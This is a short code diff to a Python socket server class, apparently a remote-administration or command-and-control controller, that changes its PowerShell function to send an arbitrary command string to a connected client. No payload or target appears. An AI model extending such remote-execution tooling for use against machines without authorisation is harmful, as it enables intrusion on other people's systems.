@@ -115,10 +115,11 @@ class Model:
         self.clients[port].conn.sendall(packet_bytes + b"\n")
 
 
-    def powershell_command(self, ip, port):
+    def powershell_command(self, ip, port, command):
         packet = {
             "type": "command",
             "command": "powershell",
+            "data": command,
         }
 
         packet_bytes = json.dumps(packet).encode('utf-8')
